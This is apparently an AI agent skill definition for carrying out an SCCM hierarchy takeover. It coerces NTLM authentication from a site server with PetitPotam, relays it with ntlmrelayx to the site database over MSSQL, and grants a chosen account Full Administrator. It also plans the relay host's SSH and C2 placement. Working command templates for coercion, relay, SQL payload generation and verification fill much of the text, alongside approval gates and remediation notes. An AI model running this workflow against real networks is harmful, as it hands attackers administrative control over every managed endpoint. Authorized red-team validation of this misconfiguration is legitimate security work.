---
name: sccm-takeover-relay
description: Validate SCCM TAKEOVER-1 style hierarchy takeover via NTLM coercion and relay to the site database, with C2-aware relay-host planning, operator SSH access requirements, prechecks, and evidence capture.
icon: ./assets/icon.png
---

# SCCM Takeover Relay

Use this skill to plan or execute SCCM `TAKEOVER-1`-style hierarchy takeover validation: coerce NTLM from a privileged SCCM site system, relay it to the site database over MSSQL, grant a chosen domain account the SCCM `Full Administrator` role, and verify the new role assignment.

This skill is for authorized lab validation only. It is OPSEC-sensitive and must remain tightly scoped.

## Direct Triggers

Use this skill when the task mentions any of the following:
- SCCM takeover
- ConfigMgr takeover
- site takeover
- NTLM relay to MSSQL for SCCM
- coercing a site server, SMS Provider, or passive site server
- Misconfiguration-Manager `TAKEOVER-1`

## Input Contract

Accept input as:
`COERCION_TARGET SITE_DB_TARGET SMS_PROVIDER_OR_PROVIDER_HOST TARGET_ACCOUNT [MODE]`

Mode:
- `plan`: build the validation workflow, operator questions, and command set only
- `execute` (default): perform prechecks, request approval for dangerous steps, and capture evidence

Examples:
- `$sccm-takeover-relay sccm-site01.corp.local sccmdb01.corp.local smsprov01.corp.local CORP\\lowpriv plan`
- `$sccm-takeover-relay 192.0.2.20 192.0.2.21 192.0.2.22 CORP\\operator execute`

## Required Operator Inputs Before Execute

In a C2 context, do not proceed past planning until these are known:

1. Where the `ntlmrelayx` server will run:
- `internal`: a host inside the target network
- `external`: a host outside the target network

2. How to SSH into the relay server:
- connection string, for example `operator@relay-host`
- authentication method, for example key path, agent-based auth, or password prompt expectation
- whether sudo is available

3. Relay-server network assumptions:
- relay server IP/FQDN that the coercion target will connect to over SMB
- whether the coercion target can reach relay-server TCP/445
- whether the relay server can reach site database TCP/1433

If any of the above is missing, ask the operator directly before execution. Do not guess relay placement or SSH access details.

## Preconditions

Confirm all of the following before coercion or relay:

1. Scope:
- target systems are in scope
- intended relay infrastructure is operator-approved

2. SCCM path assumptions from `TAKEOVER-1`:
- the site database is not hosted on the coercion target
- coercion target is one of:
  - primary site server
  - SMS Provider
  - passive site server
- the chosen SCCM site-system computer account is expected to hold `db_owner` on the site DB

3. Authentication and protocol requirements:
- valid AD credentials exist for the coercion step
- coercion target can reach relay server SMB `445`
- relay server can reach MSSQL on the site DB target `1433`
- EPA is not `Allowed` or `Required` on the site database
- NTLM restrictions do not block the coercion/relay path

4. Tooling availability:
- `ntlmrelayx`
- a coercion primitive such as `PetitPotam`
- `sccmhunter` and/or `SharpSCCM`
- optional SQL or MSSQL connectivity tooling for prechecks

## Tooling Setup

Before execution, determine which host will run each component:
- operator host
- relay host
- Windows SCCM interaction host, if needed

At minimum, account for these tools:

### Linux operator host

Required or strongly preferred:
- `python3`
- `git`
- `impacket-ntlmrelayx`
- `sccmhunter`
- a coercion tool such as `PetitPotam.py`
- optional reachability tools such as `nc` and `curl`

Typical Kali/Debian install commands:

```bash
sudo apt-get update
sudo apt-get install -y python3 python3-pip python3-venv git netcat-openbsd curl impacket-scripts
```

Verify:

```bash
which ntlmrelayx.py || which impacket-ntlmrelayx
python3 --version
```

### `sccmhunter`

If not already staged, clone it to the working host:

```bash
git clone https://github.com/garrettfoster13/sccmhunter.git
cd sccmhunter
python3 -m venv .venv
. .venv/bin/activate
pip install -r requirements.txt
```

### `PetitPotam`

If not already staged, clone it:

```bash
git clone https://github.com/topotam/PetitPotam.git
```

### Windows host for `SharpSCCM`

Use only if the operator intends to run SCCM-specific checks from Windows.
If needed, stage `SharpSCCM` on the Windows host in advance and record:
- host name
- execution path
- identity used

### Relay host

Before execution, confirm the relay host has:
- SSH access from the operator
- `ntlmrelayx` available
- network reachability to the site DB on `1433`
- an interface/IP that the coercion target can reach on SMB `445`

If the relay host is separate from the operator host, do not assume tooling parity. Verify install state on the relay host explicitly over SSH.

## Execution Workflow

1. Gather the C2 relay plan.
- Ask whether the relay server is `internal` or `external`.
- Ask for the exact SSH access pattern to that server.
- Record where `ntlmrelayx` will run and which host will launch coercion.
- Confirm the needed tooling is installed on the operator host and relay host before moving forward.

2. Build the SQL payload for SCCM admin assignment.
- Prefer `sccmhunter` on Linux to resolve the target user SID and generate the MSSQL statements.
- Use `SharpSCCM` when the operator is working from Windows.
- Capture:
  - target user/domain
  - site code
  - hex SID
  - full SQL payload

3. Run low-noise prechecks.
- confirm DNS/IP resolution for coercion target, site DB, and SMS Provider
- confirm relay host reachability assumptions
- confirm TCP/445 from coercion target to relay host where feasible
- confirm TCP/1433 from relay host to site DB where feasible
- confirm likely site DB host is separate from coercion target
- if TCP/445 testing fails, compare it against a temporary listener on an alternate relay-host port to distinguish a path issue from a 445-specific restriction

4. Prepare the relay server.
- SSH to the relay host using the operator-provided method
- record host identity, active interfaces, and the IP/FQDN that will receive coerced SMB auth
- start `ntlmrelayx` against `mssql://<SITE_DB_TARGET>` with the assembled SQL query
- prefer single-target relay mode and explicit output logging

5. OPSEC gate before dangerous steps.
- Starting `ntlmrelayx` in active relay mode is confirmation-gated.
- Triggering coercion is confirmation-gated.
- Before asking for approval, provide:
  - exact commands
  - objective
  - expected impact
  - assumptions
  - telemetry and detection surfaces

6. Trigger NTLM coercion.
- Launch the chosen coercion method against the SCCM site system, targeting the relay-server SMB listener
- capture exact command and output

7. Confirm relay success.
- collect `ntlmrelayx` output showing:
  - inbound SMB from the coercion target
  - authenticated identity, for example `SITE-SERVER$`
  - MSSQL target
  - SQL execution outcome

8. Verify SCCM role assignment.
- Prefer verifying the new `Full Administrator` assignment via WMI/AdminService on an SMS Provider
- Prefer `sccmhunter` on Linux or `SharpSCCM` on Windows
- Verification is the success condition; do not assume success from relay logs alone

9. Stop after controlled proof unless the operator explicitly extends the objective.
- Do not automatically pivot into client code execution
- report the equivalent impact and recommended next options

## Command Patterns

### Generate SQL with `sccmhunter`

```bash
python3 sccmhunter.py mssql -dc-ip <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASS>' -tu <TARGET_USER> -sc <SITE_CODE> -stacked
```

### Start `ntlmrelayx` on the relay host

```bash
ssh <SSH_CONNECTION> "impacket-ntlmrelayx -smb2support -ts -t mssql://<SITE_DB_TARGET> -q \"<SQL_QUERY>\""
```

### Trigger coercion with `PetitPotam`

```bash
python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASS> <RELAY_SERVER_IP> <COERCION_TARGET>
```

### Verify SCCM admin assignment with `sccmhunter`

```bash
python3 sccmhunter.py admin -u <USER> -p '<PASS>' -ip <SMS_PROVIDER_OR_PROVIDER_HOST>
```

### Troubleshoot blocked relay port with an alternate listener

```bash
proxychains4 -q -f /etc/proxychains4.conf nc -vz <RELAY_SERVER_IP> 445
proxychains4 -q -f /etc/proxychains4.conf nc -vz <RELAY_SERVER_IP> <ALT_PORT>
```

If `<ALT_PORT>` succeeds while `445` fails, record that the current transport path appears to disallow outbound or proxied `445`.

## Relay Placement Guidance

### Internal Relay Server

Use when the operator already has an implant, host, or pivot inside the target network that can:
- accept SMB on `445` from the coercion target
- reach MSSQL `1433` on the site DB

This is usually the cleaner path.

### External Relay Server

Use only when the coercion target can reach the external relay host over SMB and the site DB is reachable from that relay position.

Before execution, explicitly verify:
- routable IP/FQDN for the relay host
- firewall/NAT path for inbound SMB from the coercion target
- SSH path from the operator to the relay host

Do not assume an external relay path is viable just because the operator has a team server.

## OPSEC Gate

Require explicit operator confirmation before:
- starting `ntlmrelayx` in relay mode
- triggering NTLM coercion
- any broad or repeated coercion attempts
- any step that modifies SCCM RBAC in the site database

Before requesting approval, include:
- exact action to run
- expected security objective
- expected impact
- prerequisites and assumptions
- likely telemetry/artifacts
- likely detection surfaces across host, network, identity, and SIEM/EDR
- expected noise level and blast radius

## Success Criteria

Validation is successful only when all of the following are evidenced:
- SQL payload was prepared for the intended target account
- relay server received coerced authentication from the intended SCCM site system
- relay to MSSQL succeeded
- SQL statements executed successfully
- the target account is verifiably assigned SCCM `Full Administrator`

If validation is blocked before coercion:
- include whether `445` failed while an alternate port on the same host succeeded
- treat that as concrete evidence of a port-specific path restriction

## Reporting Requirements

For each run, include:
- coercion target, site DB target, SMS Provider target, and relay host details
- relay placement: `internal` or `external`
- SSH method used to access the relay host
- exact commands and outputs for:
  - SQL payload generation
  - relay-server setup
  - coercion
  - verification
- timestamps in UTC ISO 8601
- confirmed result vs inference
- observed impact
- detection opportunities
- remediation options with tradeoffs

## Remediation Themes

Always discuss:
- requiring EPA on the site database
- reducing unnecessary network paths to site systems and site DBs
- restricting NTLM where operationally possible
- monitoring SCCM site-system computer accounts authenticating from unusual sources
- reviewing SCCM RBAC changes and unexpected `Full Administrator` assignments

## References

- Misconfiguration-Manager `TAKEOVER-1`: <https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md>
- `sccmhunter`: <https://github.com/garrettfoster13/sccmhunter>
- `SharpSCCM`: <https://github.com/Mayyhem/SharpSCCM>
